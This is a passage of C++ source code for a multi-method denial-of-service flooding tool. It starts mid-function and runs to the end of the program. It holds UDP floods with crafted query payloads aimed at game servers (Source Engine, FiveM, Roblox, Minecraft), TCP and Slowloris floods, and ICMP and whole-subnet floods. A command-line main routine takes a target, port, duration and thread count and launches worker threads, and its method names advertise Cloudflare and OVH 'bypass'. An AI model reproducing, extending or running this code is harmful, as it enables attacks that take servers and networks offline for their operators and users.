        } else if (method == "counter") {
            uint8_t pkt[] = {0xFF,0xFF,0xFF,0xFF,'T','S','o','u','r','c','e',' ',
                              'E','n','g','i','n','e',' ','Q','u','e','r','y',0x00};
            payload.assign(pkt, pkt + sizeof(pkt));
        } else if (method == "fivem") {
            std::string s = "\xFF\xFF\xFF\xFFgetinfo xxx";
            payload.assign(s.begin(), s.end());
        } else if (method == "roblox") {
            uint8_t pkt[] = {
                0x05,0x00,0xFF,0xFF,0x00,0xFE,0xFE,0xFE,
                0xFE,0xFD,0xFD,0xFD,0xFD,0x12,0x34,0x56,0x78,0x01
            };
            payload.assign(pkt, pkt + sizeof(pkt));
        } else if (method == "minecraft") {
            uint8_t pkt[] = {
                0xFE,0x01,0xFA,0x00,0x0B,0x00,0x4D,0x00,0x43,0x00,0x7C,
                0x00,0x50,0x00,0x69,0x00,0x6E,0x00,0x67,0x00,0x48,0x00,0x6F,0x00,0x73,0x00,0x74
            };
            payload.assign(pkt, pkt + sizeof(pkt));
        } else {
            payload.resize(512);
            for (size_t i = 0; i < 512; ++i) payload[i] = (uint8_t)rand_int(0, 255);
        }

        sendto(sock, payload.data(), payload.size(), 0,
               (struct sockaddr *)&sin, sizeof(sin));
        g_total_sent.fetch_add(1, std::memory_order_relaxed);
    }
    close(sock);
}

// =====================================================================
// LAYER 4 — TCP
// =====================================================================
static void worker_tcp(const std::string &method, const std::string &ip, int port) {
    struct sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(port > 0 ? port : 80);
    inet_pton(AF_INET, ip.c_str(), &sin.sin_addr);

    while (g_running.load(std::memory_order_relaxed)) {
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) continue;

        int fl = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, fl | O_NONBLOCK);
        ::connect(sock, (struct sockaddr *)&sin, sizeof(sin));

        struct pollfd pfd{sock, POLLOUT, 0};
        if (poll(&pfd, 1, 1500) > 0 && (pfd.revents & POLLOUT)) {
            if (method == "socket" || method == "slowloris") {
                // Slowloris — send partial headers, keep connection open
                std::string partial = "GET / HTTP/1.1\r\nHost: " + ip + "\r\nX-Pad: ";
                send(sock, partial.c_str(), partial.size(), MSG_NOSIGNAL);
                for (int k = 0; k < 30 && g_running.load(std::memory_order_relaxed); ++k) {
                    std::string chunk = "X-" + rand_str(4) + ": " + rand_str(8) + "\r\n";
                    send(sock, chunk.c_str(), chunk.size(), MSG_NOSIGNAL);
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                }
            } else {
                std::string payload = rand_str(256);
                send(sock, payload.data(), payload.size(), MSG_NOSIGNAL);
            }
        }

        g_total_sent.fetch_add(1, std::memory_order_relaxed);
        close(sock);
    }
}

// =====================================================================
// LAYER 3 — ICMP / SUBNET
// =====================================================================
static void worker_layer3(const std::string &method, const std::string &ip, int port) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    bool raw = (sock >= 0);
    if (!raw) sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;

    struct sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port   = htons(port > 0 ? port : 0);
    inet_pton(AF_INET, ip.c_str(), &sin.sin_addr);

    while (g_running.load(std::memory_order_relaxed)) {
        if (method == "subnet") {
            // Randomize last octet to hit entire subnet
            std::string base_ip = ip;
            size_t last_dot = base_ip.rfind('.');
            if (last_dot != std::string::npos) {
                base_ip = base_ip.substr(0, last_dot + 1) + std::to_string(rand_int(1,254));
                inet_pton(AF_INET, base_ip.c_str(), &sin.sin_addr);
            }
        }

        if (raw) {
            struct icmphdr icmp{};
            icmp.type = ICMP_ECHO;
            icmp.code = 0;
            icmp.un.echo.id  = (uint16_t)rand_int(0, 0xFFFF);
            icmp.un.echo.sequence = (uint16_t)rand_int(0, 0xFFFF);
            uint8_t pkt[128];
            memcpy(pkt, &icmp, sizeof(icmp));
            for (size_t i = sizeof(icmp); i < sizeof(pkt); ++i)
                pkt[i] = (uint8_t)rand_int(0, 255);
            sendto(sock, pkt, sizeof(pkt), 0, (struct sockaddr *)&sin, sizeof(sin));
        } else {
            uint8_t pkt[256];
            for (size_t i = 0; i < sizeof(pkt); ++i) pkt[i] = (uint8_t)rand_int(0,255);
            sendto(sock, pkt, sizeof(pkt), 0, (struct sockaddr *)&sin, sizeof(sin));
        }
        g_total_sent.fetch_add(1, std::memory_order_relaxed);
    }
    close(sock);
}

// =====================================================================
// MAIN
// =====================================================================
int main(int argc, char *argv[]) {
    // Detect binary name vs explicit method arg
    char prog_path[512];
    strncpy(prog_path, argv[0], sizeof(prog_path) - 1);
    std::string method = basename(prog_path);

    int arg_offset = 1;
    if (method.find("flood") != std::string::npos ||
        method == "aio" || method == "all") {
        if (argc < 3) {
            std::cerr << "Usage:\n"
                      << "  L4: " << argv[0] << " <method> <host> <port> <time_seconds> [threads]\n"
                      << "  L7: " << argv[0] << " <method> <url> <time_seconds> [threads]\n";
            return 1;
        }
        method = argv[1];
        arg_offset = 2;
    }

    static const std::set<std::string> L7_H2_METHODS = {
        "http2","tls","tlsx","cloudflare","bypass","cache","rapidflood"
    };
    static const std::set<std::string> L7_H1_HTTPS_METHODS = {
        "https"
    };
    static const std::set<std::string> L7_H1_HTTP_METHODS = {
        "http","httpx","browser","get","post","head"
    };

    bool is_l7_check = (L7_H2_METHODS.count(method) > 0 ||
                        L7_H1_HTTPS_METHODS.count(method) > 0 ||
                        L7_H1_HTTP_METHODS.count(method) > 0);

    std::string raw_target;
    int port = 0;
    int duration = 10;
    int threads = 4;

    if (is_l7_check) {
        // L7 method can be: ./flood <method> <url> <time> [threads] (3 or 4 args)
        // or legacy: ./flood <method> <url> <port> <time> [threads] (5 args)
        if (argc < arg_offset + 2) {
            std::cerr << "Usage: " << argv[0] << " " << method << " <url> <time_seconds> [threads]\n";
            return 1;
        }
        raw_target = argv[arg_offset];

        if (argc == arg_offset + 2) {
            // <url> <time>
            duration = std::atoi(argv[arg_offset + 1]);
        } else if (argc >= arg_offset + 3) {
            // check if next is port or time
            int val1 = std::atoi(argv[arg_offset + 1]);
            int val2 = std::atoi(argv[arg_offset + 2]);
            if (argc == arg_offset + 3) {
                // <url> <time> <threads> OR <url> <port> <time>
                // If val1 is small or looks like time (e.g. 10..300) and no 4th arg
                // or if url has http
                if (val2 <= 64 && val1 >= 1) {
                    duration = val1;
                    threads = val2;
                } else {
                    port = val1;
                    duration = val2;
                }
            } else {
                // 4 or more args after target
                port = val1;
                duration = val2;
                threads = std::atoi(argv[arg_offset + 3]);
            }
        }
    } else {
        // L4 requires <host> <port> <time>
        if (argc < arg_offset + 3) {
            std::cerr << "Usage: " << argv[0] << " " << method << " <host> <port> <time_seconds> [threads]\n";
            return 1;
        }
        raw_target = argv[arg_offset];
        port     = std::atoi(argv[arg_offset + 1]);
        duration = std::atoi(argv[arg_offset + 2]);
        if (argc > arg_offset + 3) threads = std::atoi(argv[arg_offset + 3]);
    }

    if (threads  <= 0) threads  = 4;
    if (duration <= 0) duration = 10;

    // Categorise method
    static const std::set<std::string> L4_GAME_METHODS = {
        "game","rainbow","rocket","roblox","fivem","pubg","fortnite",
        "warthunder","counter","samp","minecraft"
    };
    static const std::set<std::string> L4_TCP_METHODS = {
        "tcp","socket","ovh","tcpmix","tcpbypass","ack","slowloris"
    };
    static const std::set<std::string> L3_METHODS = {
        "icmp","subnet"
    };

    bool is_l7_h2    = L7_H2_METHODS.count(method)      > 0;
    bool is_l7_https = L7_H1_HTTPS_METHODS.count(method) > 0;
    bool is_l7_http  = L7_H1_HTTP_METHODS.count(method)  > 0;
    bool is_game     = L4_GAME_METHODS.count(method)     > 0;
    bool is_tcp      = L4_TCP_METHODS.count(method)      > 0;
    bool is_l3       = L3_METHODS.count(method)          > 0;

    // URL parse
    std::string host, path;
    int default_port = (is_l7_h2 || is_l7_https) ? 443 : 80;
    if (port <= 0) port = default_port;

    // For raw IP targets (L4 methods) don't parse as URL
    bool is_l7 = is_l7_h2 || is_l7_https || is_l7_http;
    if (is_l7) {
        parse_url(raw_target, host, path, port, default_port);
    } else {
        host = trim(raw_target);
        path = "/";
        if (port <= 0) port = 80;
    }

    // Resolve hostname
    std::string target_ip;
    {
        struct hostent *he = gethostbyname(host.c_str());
        if (!he) {
            // Maybe host is already an IP
            if (inet_addr(host.c_str()) != INADDR_NONE) {
                target_ip = host;
            } else {
                std::cerr << "[-] Cannot resolve: " << host << "\n";
                return 1;
            }
        } else {
            char buf[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, he->h_addr, buf, sizeof(buf));
            target_ip = buf;
        }
    }

    std::cout << "[+] Method   : " << method      << "\n"
              << "[+] Target   : " << host << " (" << target_ip << ")\n"
              << "[+] Port     : " << port         << "\n"
              << "[+] Path     : " << path         << "\n"
              << "[+] Duration : " << duration     << "s\n"
              << "[+] Threads  : " << threads      << "\n";

#ifndef NO_SSL
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

    // H2 SSL context (ALPN h2)
    SSL_CTX *ssl_ctx_h2 = nullptr;
#ifndef NO_HTTP2
    {
        ssl_ctx_h2 = SSL_CTX_new(TLS_client_method());
        if (ssl_ctx_h2) {
            SSL_CTX_set_verify(ssl_ctx_h2, SSL_VERIFY_NONE, nullptr);
            SSL_CTX_set_options(ssl_ctx_h2, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_COMPRESSION);
            // Advertise h2 then http/1.1
            const unsigned char alpn[] = {2,'h','2', 8,'h','t','t','p','/','1','.','1'};
            SSL_CTX_set_alpn_protos(ssl_ctx_h2, alpn, sizeof(alpn));
            SSL_CTX_set_cipher_list(ssl_ctx_h2,
                "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
                "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
                "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
                "HIGH:!aNULL:!MD5:!RC4");
        }
    }
#endif

    // H1 SSL context (http/1.1 only)
    SSL_CTX *ssl_ctx_h1 = SSL_CTX_new(TLS_client_method());
    if (ssl_ctx_h1) {
        SSL_CTX_set_verify(ssl_ctx_h1, SSL_VERIFY_NONE, nullptr);
        SSL_CTX_set_options(ssl_ctx_h1, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_COMPRESSION);
        const unsigned char alpn_h1[] = {8,'h','t','t','p','/','1','.','1'};
        SSL_CTX_set_alpn_protos(ssl_ctx_h1, alpn_h1, sizeof(alpn_h1));
        SSL_CTX_set_cipher_list(ssl_ctx_h1,
            "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
            "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
            "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:"
            "HIGH:!aNULL:!MD5:!RC4");
    }
#else
    void *ssl_ctx_h2 = nullptr;
    void *ssl_ctx_h1 = nullptr;
#endif

    // Launch thread pool
    std::vector<std::thread> pool;
    pool.reserve(threads);

    for (int i = 0; i < threads; ++i) {
        if (is_l7_h2) {
#ifndef NO_SSL
#ifndef NO_HTTP2
            pool.emplace_back(worker_http2, method, ssl_ctx_h2, host, target_ip, port, path);
#else
            pool.emplace_back(worker_https1, method, ssl_ctx_h1, host, target_ip, port, path);
#endif
#else
            pool.emplace_back(worker_http1, method, host, target_ip, port, path);
#endif
        } else if (is_l7_https) {
#ifndef NO_SSL
            pool.emplace_back(worker_https1, method, ssl_ctx_h1, host, target_ip, port, path);
#else
            pool.emplace_back(worker_http1, method, host, target_ip, port, path);
#endif
        } else if (is_l7_http) {
            pool.emplace_back(worker_http1, method, host, target_ip, port, path);
        } else if (is_game) {
            pool.emplace_back(worker_game, method, target_ip, port);
        } else if (is_tcp) {
            pool.emplace_back(worker_tcp, method, target_ip, port);
        } else if (is_l3) {
            pool.emplace_back(worker_layer3, method, target_ip, port);
        } else {
            pool.emplace_back(worker_udp, method, target_ip, port);
        }
    }

    std::this_thread::sleep_for(std::chrono::seconds(duration));
    g_running.store(false, std::memory_order_relaxed);

    for (auto &t : pool) if (t.joinable()) t.join();

#ifndef NO_SSL
    if (ssl_ctx_h1) SSL_CTX_free(ssl_ctx_h1);
    if (ssl_ctx_h2) SSL_CTX_free(ssl_ctx_h2);
#endif

    std::cout << "[+] Done. Total sent: " << g_total_sent.load() << "\n";
    return 0;
}
